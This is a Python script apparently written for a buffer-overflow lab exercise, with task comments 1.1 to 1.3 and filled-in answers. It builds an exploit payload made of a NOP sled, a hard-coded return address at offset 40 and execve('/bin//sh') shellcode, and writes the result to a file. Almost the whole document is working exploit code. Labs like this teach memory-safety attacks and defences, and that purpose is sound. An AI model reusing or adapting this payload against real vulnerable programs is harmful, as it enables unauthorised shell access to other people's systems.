#!/usr/bin/python3
import sys

shellcode= (
    "\x31\xc0"             # xorl    %eax,%eax
    "\x50"                 # pushl   %eax
    "\x68""//sh"           # pushl   $0x68732f2f
    "\x68""/bin"           # pushl   $0x6e69622f
    "\x89\xe3"             # movl    %esp,%ebx
    "\x50"                 # pushl   %eax
    "\x53"                 # pushl   %ebx
    "\x89\xe1"             # movl    %esp,%ecx
    "\x99"                 # cdq
    "\xb0\x0b"             # movb    $0x0b,%al
    "\xcd\x80"             # int     $0x80
    "\x00"
).encode('latin-1')

# Task 1.1:p
# Fill the content with NOP's

content = bytearray()
for i in range(517):
    content.append(0x90)


#########################################################################
# Task 1.2:
# Replace 0 with the correct offset value
offset = 40

# Task 1.3:
# Fill the return address field with the address of the shellcode
# Replace 0xFF with the correct value
content[offset+0] = 0x40   # fill in the 1st byte (least significant byte)
content[offset+1] = 0xdb   # fill in the 2nd byte
content[offset+2] = 0xff   # fill in the 3rd byte
content[offset+3] = 0xff   # fill in the 4th byte (most significant byte)
content[offset+4] = 0xff
content[offset+5] = 0x7f
content[offset+6] = 0x00
content[offset+7] = 0x00
#########################################################################
#0x7fffffffdb40
# Put the shellcode at the end
start = 517 - len(shellcode)
content[start:] = shellcode

# Write the content to badfile
file = open("shellcode", "wb")
file.write(content)
file.close()
